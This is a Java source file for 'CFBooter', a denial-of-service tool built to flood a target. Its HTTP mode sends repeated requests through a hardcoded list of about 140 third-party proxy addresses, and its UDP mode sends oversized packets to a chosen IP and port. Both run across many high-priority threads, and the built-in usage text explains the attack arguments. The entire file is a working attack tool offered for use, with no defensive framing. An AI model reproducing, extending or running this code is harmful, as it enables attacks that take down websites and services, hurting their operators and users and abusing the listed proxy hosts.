package com.coffos.cfbooter;

import java.io.*;
import java.net.*;
import java.util.Random;
import java.util.stream.IntStream;

public class Main {

    /* Variables */
    private static String host, method, cookie, pack = "pack += \"❦\\n\";pack += \"❦\\n\";", wMode;
    private static int wPower, hPower, wPort;
    private static String[] proxy = {
            "136.244.81.26:30766",
            "176.31.69.182:8080",
            "104.248.167.58:80",
            "178.62.244.192:8080",
            "128.199.54.60:3128",
            "206.189.118.179:8080",
            "195.201.32.120:3128",
            "51.15.120.43:3128",
            "37.139.11.197:3128",
            "207.180.223.239:80",
            "188.166.119.186:80",
            "54.37.79.198:8080",
            "151.80.199.89:3128",
            "149.202.34.104:3128",
            "51.158.68.133:8811",
            "45.77.54.39:8080",
            "51.158.186.84:3128",
            "52.157.215.147:3128",
            "51.75.127.193:3128",
            "5.39.65.43:3128",
            "178.32.80.235:8080",
            "52.157.215.67:3128",
            "51.158.119.88:8811",
            "51.254.167.223:3128",
            "95.168.185.183:8080",
            "95.179.245.60:33086",
            "51.91.139.89:8080",
            "51.158.186.84:8080",
            "91.205.174.26:80",
            "62.210.124.248:3128",
            "51.68.61.17:8080",
            "52.142.235.16:8080",
            "95.179.152.217:3128",
            "95.179.152.217:8080",
            "136.244.81.26:30766",
            "144.91.80.233:3128",
            "116.202.110.204:3128",
            "116.203.127.92:3128",
            "104.244.77.254:8080",
            "128.199.54.60:3128",
            "104.244.75.26:8080",
            "206.189.118.179:8080",
            "195.201.32.120:3128",
            "51.15.120.43:3128",
            "207.180.226.111:3128",
            "207.180.223.239:80",
            "185.111.88.52:3128",
            "54.37.79.198:8080",
            "195.231.71.45:8080",
            "207.154.200.199:3128",
            "188.166.119.186:80",
            "217.61.23.111:3128",
            "217.61.23.111:8080",
            "207.180.226.111:8080",
            "199.247.20.58:32124",
            "195.154.207.153:80",
            "34.251.140.197:3128",
            "217.61.23.111:80",
            "207.180.226.111:80",
            "35.177.127.142:3128",
            "35.177.190.183:80",
            "35.240.8.116:8888",
            "37.59.40.152:3128",
            "137.135.254.0:3128",
            "144.91.80.233:9999",
            "141.125.82.106:80",
            "138.201.72.117:80",
            "144.91.80.230:9999",
            "13.69.22.40:8080",
            "159.89.105.97:3128",
            "51.158.113.142:8811",
            "5.189.133.231:80",
            "51.254.167.223:3128",
            "51.158.98.121:8811",
            "51.15.193.253:3128",
            "40.69.35.132:3128",
            "46.101.176.49:8080",
            "142.93.130.169:8118",
            "163.172.136.226:8811",
            "144.91.80.231:3128",
            "163.172.87.9:3128",
            "144.91.80.232:3128",
            "173.212.202.65:80",
            "164.68.103.171:3128",
            "51.158.120.84:8811",
            "51.158.119.88:8811",
            "91.205.174.26:80",
            "52.157.215.147:3128",
            "51.158.111.242:8811",
            "5.196.132.127:3128",
            "46.105.123.30:3128",
            "144.91.80.229:3128",
            "163.172.147.94:8811",
            "148.251.43.87:3128",
            "178.128.243.130:8080",
            "157.230.112.218:8080",
            "173.249.35.163:1448",
            "173.212.254.240:8080",
            "51.158.68.133:8811",
            "51.158.186.84:8080",
            "54.36.229.125:3128",
            "51.75.127.193:3128",
            "5.39.65.43:3128",
            "151.80.199.89:3128",
            "165.227.160.139:80",
            "167.71.142.245:8080",
            "18.203.247.168:80",
            "52.157.215.67:3128",
            "52.142.235.16:8080",
            "5.196.132.126:3128",
            "157.230.112.218:80",
            "167.86.70.51:8080",
            "173.212.196.163:8000",
            "51.158.123.35:8811",
            "88.99.76.98:3128",
            "54.36.89.115:3128",
            "62.210.203.105:3128",
            "94.177.224.211:3128",
            "163.172.189.32:8811",
            "178.62.246.248:8080",
            "51.158.108.135:8811",
            "51.158.68.68:8811",
            "95.179.245.60:33086",
            "91.236.239.149:3128",
            "94.177.255.8:80",
            "178.32.218.91:80",
            "51.158.111.229:8811",
            "51.89.229.55:8080",
            "94.177.224.211:8080",
            "51.91.139.89:8080",
            "51.158.68.26:8811",
            "94.177.224.211:80",
            "62.210.124.248:3128",
            "51.158.99.51:8811",
            "95.168.185.183:8080",
            "80.211.31.121:8080",
            "77.73.241.154:80",
            "94.23.218.85:80",
            "87.236.212.189:8080",
            "94.177.255.8:8080"
    };
    private static Random rand = new Random();
    private static boolean wProxy;
    private static boolean force;

    private static void printCFBooter() {
        System.out.println("   _____ ______ ____              _            \n" +
                "  / ____|  ____|  _ \\            | |           \n" +
                " | |    | |__  | |_) | ___   ___ | |_ ___ _ __ \n" +
                " | |    |  __| |  _ < / _ \\ / _ \\| __/ _ \\ '__|\n" +
                " | |____| |    | |_) | (_) | (_) | ||  __/ |   \n" +
                "  \\_____|_|    |____/ \\___/ \\___/ \\__\\___|_|   \n" +
                "                                               \n" +
                "                                               ");
    }

    private static void inheritCMD(String cmd) {
        try {
            new ProcessBuilder("cmd", "/c", cmd).inheritIO().start().waitFor();
        } catch (InterruptedException | IOException e) {
            e.printStackTrace();
        }
    }

    public static void main(String... args) {
        inheritCMD("color 4");
        printCFBooter();
        int a1 = Integer.parseInt(args[1]);
        System.out.println(args.length == 7 ?
                ">> Started CFBooter!" +
                        "\n\nHere's your args:" +
                        "\nURL <*> " + args[0] +
                        "\nLOOPTIME <*> " + args[1] + " " + (a1 != 30 ? "[RECOMMENDED: 30]" : "") +
                        "\nMETHOD <*> " + args[2] +
                        "\nCOOKIE <*> " + args[3].replace("[sp]", " ") +
                        "\nMODE <*> " + args[4] +
                        "\nPORT <*> " + args[5] +
                        "\nUSE PROXIES <*> " + Boolean.parseBoolean(args[6]) :
                ">> More args are required!\n\n" +
                        "For HTTP Flooding: [url(string)] [loopTime(int)] [method(string)[ex: POST]] [cookie(string)] http [port(int, leave as 0)] [useProxy(boolean)]\nIf your cookie requires spaces, replace the space with [sp].\n\n" +
                        "For UDP Flooding BETA: [ip(string)] [loopTime(int)] [method(string, leave as 0)] [cookie(string, leave as 0)] udp [port(int)] [useProxy(boolean, keep as false)]");
        if (args.length != 7) return;
        startAttack(args[0], a1, args[2], 20, 50, args[3].replace("[sp]", " "), args[4], Integer.parseInt(args[5]), Boolean.parseBoolean(args[6]));
    }

    /* Start a attack */
    private static void startAttack(String url, int time, String wMethod, int power, int WHPower, String wCookie, String mode, int port, boolean useProxy) {
        host = url;
        method = wMethod;
        wPower = power;
        hPower = WHPower;
        cookie = wCookie;
        wMode = mode;
        wPort = port;
        wProxy = useProxy;
        IntStream.range(0, time).forEachOrdered(i -> startThreads());
    }

    private static void startThreads() {
        Thread thread = new Thread(() -> {
            try {
                attack();
            } catch (Exception ignored) {
            }
        });
        Thread thread2 = new Thread(() -> {
            try {
                attack();
            } catch (Exception ignored) {
            }
        });
        Thread thread3 = new Thread(() -> {
            try {
                attack();
            } catch (Exception ignored) {
            }
        });
        Thread thread4 = new Thread(() -> {
            try {
                attack();
            } catch (Exception ignored) {
            }
        });
        Thread thread5 = new Thread(() -> {
            try {
                attack();
            } catch (Exception ignored) {
            }
        });
        Thread thread6 = new Thread(() -> {
            try {
                attack();
            } catch (Exception ignored) {
            }
        });
        Thread thread7 = new Thread(() -> {
            try {
                attack();
            } catch (Exception ignored) {
            }
        });
        Thread thread8 = new Thread(() -> {
            try {
                attack();
            } catch (Exception ignored) {
            }
        });
        Thread thread9 = new Thread(() -> {
            try {
                attack();
            } catch (Exception ignored) {
            }
        });
        Thread thread10 = new Thread(() -> {
            try {
                attack();
            } catch (Exception ignored) {
            }
        });
        Thread thread11 = new Thread(() -> {
            try {
                attack();
            } catch (Exception ignored) {
            }
        });
        thread.start();
        thread.setPriority(Thread.MAX_PRIORITY);
        thread2.start();
        thread2.setPriority(Thread.MAX_PRIORITY);
        thread3.start();
        thread3.setPriority(Thread.MAX_PRIORITY);
        thread4.start();
        thread4.setPriority(Thread.MAX_PRIORITY);
        thread5.start();
        thread6.start();
        thread7.start();
        thread8.start();
        if (force) {
            thread9.start();
            thread10.start();
            thread11.start();
        }
    }

    private static void attack() throws Exception {
        System.gc();
        for (int i = 0; i < wPower; i++) {
            for (int i2 = 0; i2 < hPower; i2++) {
                Thread packLength = new Thread(() -> {
                    if (!(pack.length() >= 644000)) pack += "Å";
                });
                packLength.setPriority(Thread.MAX_PRIORITY);
                packLength.start();
                switch (wMode) {
                    case "udp":
                        DatagramSocket socket = new DatagramSocket();
                        byte[] data = pack.getBytes();
                        try {
                            socket.send(new DatagramPacket(data, data.length, InetAddress.getByName(host), wPort));
                            System.out.println("[" + host + "] Sent " + pack.length() + " bytes of data!");
                        } catch (IOException ignored) {
                        }
                        socket.close();
                        break;
                    case "http":
                        int currentRandInt = rand.nextInt(proxy.length);
                        String r_proxy = proxy[currentRandInt];
                        String f_proxy_port = r_proxy.substring(r_proxy.lastIndexOf(":") + 1);
                        String r_proxy_port = r_proxy.substring(r_proxy.lastIndexOf(":"));
                        String f_proxy = r_proxy.replace(r_proxy_port, "");

                        HttpURLConnection connection;
                        if (wProxy) connection = (HttpURLConnection) new URL(host).openConnection(new Proxy(Proxy.Type.HTTP, new InetSocketAddress(f_proxy, Integer.parseInt(f_proxy_port))));
                        else connection = (HttpURLConnection) new URL(host).openConnection();
                        connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0");
                        connection.setRequestProperty("Cookie", cookie.replace("[sp]", " "));
                        connection.setRequestProperty("Accept", "*/*");
                        connection.setRequestProperty("Content-Type", "text/plain");
                        connection.setRequestProperty("Cache-Control", "no-cache");
                        connection.setRequestProperty("Accept-Encoding", "gzip-deflate");
                        connection.setRequestProperty("Content-Length", "86");
                        connection.setRequestMethod(method);
                        connection.setUseCaches(false);
                        int response = connection.getResponseCode();
                        System.out.println("[" + host + "], CONNECTION: [" + response + "]");
                        connection.disconnect();
                        break;
                }
            }
        }
    }

    private static String resolve(String host) throws Exception {
        URL url;
        if (host.contains("http://")) url = new URL(host);
        else url = new URL("http://" + host);
        return InetAddress.getByName(url.getHost()).getHostAddress();
    }

    private static String read(InputStream is) throws IOException {
        BufferedReader in = null;
        StringBuilder body;
        try {
            in = new BufferedReader(new InputStreamReader(is));

            body = new StringBuilder();

            in.lines().forEachOrdered(body::append);
            in.close();

            return body.toString();
        } finally {
            closeQuietly(in);
        }
    }

    private static void sendData(HttpURLConnection con, String data) throws IOException {
        DataOutputStream wr = null;
        try {
            wr = new DataOutputStream(con.getOutputStream());
            wr.writeBytes(data);
            wr.flush();
            wr.close();
        } finally {
            closeQuietly(wr);
        }
    }

    private static void closeQuietly(Closeable closeable) {
        try {
            if (closeable != null) closeable.close();
        } catch (IOException ignored) {
        }
    }
}